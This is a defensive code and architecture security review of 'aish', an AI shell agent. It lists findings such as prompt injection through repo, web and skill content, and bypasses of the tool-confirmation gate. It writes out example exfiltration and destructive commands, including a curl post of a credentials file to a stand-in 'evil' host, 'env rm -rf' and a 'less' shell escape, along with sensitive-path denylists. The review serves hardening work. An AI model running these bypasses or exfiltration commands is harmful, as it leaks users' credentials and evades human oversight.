# aish — Security Review (code + architecture)

Scope: `aish` v0.52.1 (`/Users/grhohertz/projects/aish`), Rust 2024, ~6.7k-line
`src/tools.rs` tool layer plus `engine.rs`, `main.rs`, `coordinator.rs`,
`update.rs`, `hooks.rs`, `plugins.rs`, `skill_provider.rs`, `db.rs`, `fd_shield.rs`.
Review type: manual white-box read of the trust boundary (tool gate, exec path,
secret handling, supply chain). No dynamic testing / fuzzing performed.

---

## 1. Threat model as it exists today

aish *is* the shell: the model emits tool calls that fork/exec real binaries,
read/write arbitrary paths, and reach the network, running with the full
privileges of the invoking user. The only control between a model token and a
syscall is the **safety gate** in `src/tools.rs` (`exec_needs_confirm`,
`is_read_only`, `is_destructive`, `gate*`), parameterised by a session `Mode`
(`Paranoid` / `Careful` / `Normal` / `Yolo`).

Two structural assumptions underpin that design, and both are violable:

1. **"The model's intent is the user's intent."** Untrusted content — repo
   files, PR/issue bodies, web pages, MCP tool results, third-party `SKILL.md`
   files — flows into the *same* context that authorises tool calls. There is no
   provenance/taint tracking and no instruction-vs-data separation, so a prompt
   injection in any of those sources is indistinguishable from an operator
   request. This is the dominant risk, and it is amplified by (2).
2. **"Classification by program name approximates capability."** The gate is a
   string-match allowlist/denylist over `bin_name(program)` + argv tokens. It is
   bypassable by wrapper binaries, interpreters, and argv shape (see F-03/F-04),
   and it models *mutation* only — **confidentiality is not modelled at all**,
   so reads of `~/.ssh`, `~/.aws`, `~/.atum/credentials` and network egress are
   unprivileged operations.

Net: the realistic worst case is **unattended arbitrary code execution and
credential exfiltration as the local user, triggered by content the agent was
merely asked to read** — most acutely inside background coordinators, which run
gate-free (F-01).

---

## 2. Findings

Severity: **C**ritical / **H**igh / **M**edium / **L**ow. "Evidence" is
`file:line` from this tree.

| # | Sev | Finding | Evidence | Why it matters | Recommendation |
|---|-----|---------|----------|----------------|----------------|
| F-01 | **C** | Background coordinators run with **all gating disabled** (`Mode::Yolo`) | `src/main.rs:713` (`--coordinator` → `session.mode = session::Mode::Yolo`); `src/tools.rs:1203` treats `session.nested` like Yolo | Every `run_in_background` job can exec any binary, write/delete any path, with zero confirmation and no human watching. A single prompt injection in a file/PR/web page a coordinator reads becomes unattended RCE. Coordinators are also the *most* exposed surface (they read the most untrusted input). | Introduce a distinct **`Unattended` mode** instead of reusing Yolo: deny-by-default for destructive + egress + interpreter classes, hard-refuse the irreversible set (push/merge/delete/send/secret-read), inherit only the launching session's explicit always-allow grants, and escalate blocked actions to the operator via `message_console` rather than executing them. |
| F-02 | **C** | Secret exfiltration primitive: `${profile:KEY}` resolution + `env` on the read-only allowlist | `src/tools.rs:3090` `resolve_env`, `3106` `resolve_env_value` (reads `$HOME/.atum/credentials`, any profile/key); `env`/`printenv` listed at `src/tools.rs:818+` | The model controls *both* the `env` map and the `program`. `run_program("env", [], env:{X:"${profile:ANTHROPIC_API_KEY}"})` returns the plaintext secret in stdout → straight into the transcript/DB/logs. This directly defeats the documented guarantee that "secret values never enter the conversation", and in Careful mode it isn't even prompted. | (a) Refuse to resolve a `profile:` ref when the target program is an env-dumper/interpreter/unknown binary without explicit confirmation; (b) post-exec **redaction**: scrub every resolved secret value out of captured stdout/stderr before returning to the model; (c) gate profile reads behind a per-session key allowlist and log each secret materialisation. |
| F-03 | **H** | Read-only allowlist contains **exec wrappers and shell-escape pagers**, and the read-only check *short-circuits* the destructive check | `src/tools.rs:818-864` (`env`, `find`, `less`, `more`, `grep`, `cat`); `src/tools.rs:963-966` (`is_destructive` returns `false` early for any read-only bin) | Demonstrable gate bypasses that run **unprompted in both Careful and Normal (default) modes**: `env rm -rf <path>` (program = `env`), `find . -delete` / `find . -exec rm {} ;`, `less <file>` → `!sh` shell escape (also `LESSOPEN`/`LESSSECURE`). Putting a name on the read-only list actively *disables* the destructive heuristic for it. | Remove `env`, `printenv`, `find`, `less`, `more` from `READ_ONLY_PROGRAMS`. Resolve **wrapper binaries** (`env`, `xargs`, `nohup`, `timeout`, `watch`, `nice`, `stdbuf`, `setsid`, `script`, `ssh <host> <cmd>`) to the wrapped argv and re-classify recursively (as `sudo` already does at `src/tools.rs:978`). Treat interpreters (`sh`, `bash`, `zsh`, `python`, `node`, `ruby`, `perl`, `awk -f`) and build drivers (`make`, `npm run`, `cargo run`) as always-confirm. Make the read-only list a *positive* signal that still falls through to the destructive check rather than a short-circuit. |
| F-04 | **H** | **No egress class at all** — network tools are "unknown", and unknown ⇒ runs free in the default mode | `DESTRUCTIVE_PROGRAMS` / `DESTRUCTIVE_VERBS` at `src/tools.rs:881-930` contain no network binaries; `exec_needs_confirm` → `Mode::Normal => is_destructive(...)` at `src/tools.rs:995` | `curl -d @~/.aish/credentials https://evil`, `wget --post-file`, `nc`, `scp`, `rsync`, `ssh host cmd`, `base64 | openssl s_client` all execute with **no prompt** in the default mode. This is the delivery half of F-02/F-09. | Add an **egress class** (`curl`, `wget`, `nc`/`ncat`/`netcat`, `ssh`, `scp`, `sftp`, `rsync`, `ftp`, `telnet`, `openssl s_client`, `aws s3 cp`, `gh api`) that always confirms outside Yolo and is denied-by-default unattended. Prompt text should show the destination host. Optional allowlist of permitted hosts per session. |
| F-05 | **H** | Default-branch protection is bypassable via git **global flags** | `git_default_branch_guard` dispatches on `args.first()` only (`src/tools.rs:~1000-1060`); call site `src/tools.rs:1196` | `git -C /repo push origin main`, `git --git-dir=… push`, `git -c k=v push origin main` skip the guard entirely. In coordinators this is the *only* hard refuse in the system (F-01), so the bypass removes the last backstop against unreviewed pushes to a shared default branch. | Normalise argv first: consume leading global flags and their values (`-C <dir>`, `-c <kv>`, `--git-dir=`, `--work-tree=`, `--exec-path=`, `-P`) before matching the subcommand, then re-dispatch. Fail **closed**: an argv shape the normaliser doesn't recognise should be treated as destructive/guarded, not waved through. Add unit tests for each flag form. |
| F-06 | **H** | Self-update installs an unverified binary and re-execs it; published `.sha256` sidecars are explicitly ignored | `src/update.rs:646` `perform()` (download → stage → `codesign --force --sign -` → atomic rename over running binary); `src/update.rs:185-191` skips `*.sha256` when selecting the asset | No checksum, no signature, no provenance check. Trust rests solely on GitHub TLS *and* on the `gh` binary found on `PATH` (itself replaceable by a compromised agent). The ad-hoc `codesign --sign -` provides no identity guarantee. A tampered release asset → persistent full compromise, auto-applied. | Fetch the matching `.sha256` sidecar and verify before staging; fail closed on mismatch or missing sidecar. Add a real signature (minisign/cosign) and/or `gh attestation verify` (SLSA provenance) in the release workflow and enforce it client-side. Pin the `gh` invocation to an absolute path and verify version. |
| F-07 | **M** | Always-allow grants are **coarse and persistent** — keyed on bare binary name | `allow_key()` at `src/tools.rs:170-180`; `gate()` persists via `session.allow_tool(key)` at `src/tools.rs:62` | "Always allow `git`" also allows `git push --force`; "always allow `python`" is a permanent arbitrary-code-execution grant; "always allow `docker`" includes `docker run -v /:/host`. Grants appear to persist indefinitely with no review surface. | Key on **binary + first non-flag subcommand** for multiplexers (`git`, `gh`, `docker`, `kubectl`, `aws`, `npm`, `cargo`, `systemctl`, `terraform`). Never offer "always" for interpreters or the egress class. Default grants to session scope with an explicit `--persist`, and add `:perms` to list/revoke. |
| F-08 | **M** | `git` read-only classification is argv-order naive | `git_is_read_only` at `src/tools.rs:943-951` | `Some("config") => args.len() <= 2 \|\| any(--list\|--get)` — `git config --get-regexp …` and flag-prefixed forms land inconsistently, and `config`/`stash` are in `GIT_READ_ONLY` as a backstop. `git config` can set `core.pager`/`core.hooksPath`/`alias.*` → arbitrary exec on a later innocuous git command. | Classify `git config` as read-only **only** for explicit read forms (`--get`, `--get-all`, `--get-regexp`, `--list`, no value argument), and treat any write to `core.pager`, `core.hooksPath`, `core.editor`, `credential.helper`, `alias.*`, `*.sshCommand` as destructive regardless of mode. Table-drive + unit-test the whole classifier. |
| F-09 | **M** | No path containment and **no sensitive-path denylist** | `resolve()` at `src/tools.rs:805-812` (`session.cwd.join(p)`, no canonicalise/containment); write gating free in Yolo at `src/tools.rs:4000` (`gate_write_op`), same pattern in the other file tools | `read_file("~/.ssh/id_ed25519")`, `read_file("/Users/x/.atum/credentials")`, `copy_file` of `~/.aws/credentials` into the repo — prompted in Careful, **silent in Normal/Yolo/coordinator**. Reads are modelled as harmless, but these are the crown jewels (F-02 delivery via F-04). | Add an **always-confirm, never-always-allow** sensitive-path denylist enforced in *every* mode including Yolo/coordinator: `**/.ssh/**`, `**/.aws/**`, `**/.gnupg/**`, `**/.atum/credentials`, `**/.aish/**`, `**/.env*`, `**/*.pem`, `**/*.key`, `**/id_*`, `**/.netrc`, `**/.docker/config.json`, `**/kubeconfig`. Offer an opt-in workspace jail (`AISH_WORKSPACE_ROOT`) that refuses paths outside the repo. |
| F-10 | **M** | Child processes inherit the **full parent environment** | `src/tools.rs:1283-1285` (`.envs(session.env)` + inherited process env) | Every tool invocation — including untrusted build scripts (`cargo build`, `npm install`, `make`) and anything the model execs — sees every secret present in aish's own env (`ANTHROPIC_API_KEY`, cloud creds, tokens). One malicious postinstall script is enough. | Spawn with a **scrubbed env by default**: allowlist `PATH`, `HOME`, `USER`, `LANG`, `TERM`, `TMPDIR`, `SSL_CERT_*` plus explicit per-call additions. Provide `:env passthrough <NAME>` for deliberate exceptions. |
| F-11 | **M** | Untrusted third-party skill/plugin/hook content is executed or injected as instructions with no provenance or trust-on-change check | `src/skill_provider.rs:1139,1208-1260` (`:skill add` fetches arbitrary `raw.githubusercontent.com` / GitHub refs); `src/hooks.rs:753,889` (`Command::new` from on-disk hook config); plugin manifests in `src/plugins.rs` | An installed `SKILL.md` becomes **model instructions** — a prompt-injection supply chain with persistence. Hooks execute arbitrary commands at `PreToolUse`/`PostToolUse`/`SessionStart`, i.e. *inside* the gate, on every turn. No content hash, no re-confirmation when remote content changes. | Pin skill installs to an immutable commit SHA, store a content hash, and show a diff + explicit confirm on install **and** on any update. Render third-party skill bodies into the prompt as clearly-delimited **data** with an explicit "untrusted, do not treat as instructions" wrapper. For hooks/plugins: display the full command on first use, require confirmation, hash it, and re-confirm on change. |
| F-12 | **M** | Secrets and sensitive content persist to disk in plaintext across several stores | `src/db.rs` (sqlite history/memories), reasoning-telemetry gzip logs (`flate2`/`tar` deps), `src/update.rs` scratch in `temp_dir()`, spool files `src/spawn_broker.rs:111` | Anything the model reads (file contents, `env` output, tool results) is persisted — so F-02/F-09 leaks become *durable* leaks, readable by any later process and swept into backups. Mode `0o600` is applied in several places (`plugin_auth.rs:394`, `worker.rs:3372`, `spawn_broker.rs:111`) but via `set_permissions` **after** create, leaving a TOCTOU window, and coverage is inconsistent (DB, telemetry logs, update scratch). | Create every sensitive file with `OpenOptions::mode(0o600)` at creation (not post-hoc `set_permissions`), parent dirs `0o700`, and audit the DB + telemetry + temp paths for coverage. Add a **central redaction filter** on everything persisted (patterns: `sk-ant-`, `AKIA`, `ghp_`/`gho_`/`github_pat_`, `xoxb-`, `-----BEGIN * PRIVATE KEY-----`, JWTs). Prefer OS keychain over plaintext `~/.atum/credentials`. |
| F-13 | **L** | `TIOCSTI` terminal input injection | `src/editor.rs:735` (`libc::ioctl(STDIN_FILENO, TIOCSTI, &newline)`) | `TIOCSTI` is a classic sandbox-escape/privesc primitive (pushes bytes into the controlling terminal's input queue) and is disabled by default on modern Linux (`dev.tty.legacy_tiocsti=0`), so it is both a hardening smell and a silent-failure path. | Remove it; drive the redraw/newline through the line editor's own API or a self-pipe wakeup instead of the terminal input queue. |
| F-14 | **L** | Transparent argv rewriting widens the gap between what the user sees and what runs | `dedup_program_argv` at `src/tools.rs:1088`, `unwrap_noexec_builtin` at `src/tools.rs:1102-1155` (`command`/`builtin` → arbitrary program, `type` → `which`) | `command -p rm -rf /` is rewritten to a different program than the operator's literal text. The rewrite happens *before* gating (correct), and the confirm prompt shows the final argv (good) — but the rewrite is silent and could mask intent in logs/audit. | Keep the rewrite pre-gate, and record **both** the original and rewritten argv in the audit trail; surface "rewritten from …" in the confirm prompt. |
| F-15 | **L** | sqlite extension loading via `unsafe extern "C"` init | `src/db.rs:31-36` (`sqlite-vec` init fn) | Statically linked here (low risk), but if SQLite extension loading remains enabled on the connection it is an RCE surface for anyone who can influence SQL or the DB file. | Call the init explicitly, then **disable** extension loading on the connection (`db.load_extension_disable()` / `SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION = 0`). Keep the `unsafe` block documented with its safety contract. |
| F-16 | **L** | `unsafe` libc surface is small but unaudited mechanically | `src/fd_shield.rs` (raw `pipe`/`dup2`/`from_raw_fd`), `src/keywatch.rs`, `src/editor.rs`, `src/hwdetect.rs:582`, `src/coordinator.rs:793`, `src/engine.rs:1634` | fd-shuffling + `from_raw_fd` double-ownership bugs are the classic source of fd confusion / use-after-close. Memory-safety regressions here would be silent. | Add `#![deny(unsafe_op_in_unsafe_fn)]`, a `// SAFETY:` contract on every block, and run the `fd_shield` tests under Miri / ASAN in CI. |
| F-17 | **L** | Default mode is the **permissive** one (`Normal` = unknown commands run free) | `exec_needs_confirm` at `src/tools.rs:988-1000` | The security posture most users get is "anything not name-matched as destructive executes silently" — which is precisely the class F-03/F-04 exploit. | Ship **`Careful`** as the default (after fixing F-03, which currently makes Careful weaker than it looks), and document the mode matrix + threat model in a `SECURITY.md` (absent today) with a vulnerability-reporting address. |
| F-18 | **L** | No supply-chain gates in the dependency graph | `Cargo.toml` (no `cargo-deny`/`audit` config in tree); 20+ direct deps incl. `reqwest`, `rusqlite` bundled, `sqlite-vec`, `tar`, `flate2` | Transitive CVEs and license drift land silently; `tar` extraction in `update.rs` is also a path-traversal surface (zipslip) since it shells out to `tar -xzf` with no member validation. | Add `cargo audit` + `cargo deny` (advisories, bans, licenses, sources) to CI alongside the existing `--locked` gate; enable Dependabot. In `update.rs`, prefer in-process extraction with member-path validation, or pass `--no-same-owner --no-same-permissions` and verify extracted paths stay under the scratch dir. |

### Positives worth preserving

- No `unsafe` in the hot tool path; no `danger_accept_invalid_certs` anywhere; `rustls` (not OpenSSL) for TLS.
- No network listeners outside tests (`TcpListener` bindings are test-only, loopback `127.0.0.1:0`).
- No shell interpreter in the exec path — `fork/exec` with an explicit argv kills the entire shell-metacharacter injection class by construction. This is the single best design decision in the codebase and should stay inviolable (note F-03 is exactly the erosion of it: wrappers/pagers smuggle a shell back in).
- Output is capped and middle-truncated (`drain_capped`), timeouts clamped, `kill_on_drop(true)` prevents orphans.
- `0o600` discipline exists and is even **asserted in tests** (`plugin_auth.rs:482`, `spawn_broker.rs:518`, `spawn_broker_policy.rs:1093`) — extend that pattern to the remaining stores (F-12).
- The default-branch guard and its hard-refuse-when-unattended behaviour is the right *shape* of control (it just needs F-05's argv normalisation).

---

## 3. Recommended sequencing

| Order | Work | Findings closed | Rationale |
|-------|------|-----------------|-----------|
| 1 | Argv normalisation + classifier rewrite (wrapper/interpreter resolution, drop `env`/`find`/`less`/`more`, read-only no longer short-circuits, git global-flag normalisation) — table-driven with unit tests | F-03, F-05, F-08 | Pure-logic, high-leverage, fully testable; every other control depends on classification being sound. |
| 2 | `Unattended` mode for coordinators + egress class + sensitive-path denylist enforced in all modes | F-01, F-04, F-09 | Closes the unattended-RCE and exfiltration path — the actual worst case. |
| 3 | Secret handling: scoped `profile:` resolution, post-exec redaction, scrubbed child env, central persisted-output redaction, create-time `0o600` | F-02, F-10, F-12 | Makes the documented "secrets never enter the conversation" guarantee true. |
| 4 | Update integrity: verify `.sha256`, then signature/attestation; harden `tar` extraction | F-06, F-18 | Prevents a one-shot tampered release from becoming persistent compromise. |
| 5 | Grant hygiene (`binary+subcommand` keys, session-scoped by default, `:perms`), skill/hook trust-on-change + untrusted-data framing | F-07, F-11 | Reduces blast radius of both operator fatigue and injection persistence. |
| 6 | `SECURITY.md` + threat model, `Careful` default, `cargo audit`/`deny` in CI, Miri on `fd_shield`, drop `TIOCSTI`, disable sqlite extension loading | F-13, F-15, F-16, F-17, F-18 | Durable hygiene; cheap. |

## 4. Residual architectural gap (not fixable by a patch)

Even with all 18 findings closed, the gate still authorises actions from a
context that **mixes untrusted content with operator intent**. The structural
mitigation is provenance/taint tracking: tag tool results that originate from
remote or third-party sources, and once untrusted content has entered the
context, escalate gating (force confirm, and refuse the irreversible class)
for the remainder of the turn. Pair that with an explicit irreversibility
classification — reversible actions proceed on the model's judgement,
irreversible ones (push, merge, delete, send, rotate, pay) always require a
human — which matches the operating principle already stated in aish's own
system prompt but is not yet enforced in code.
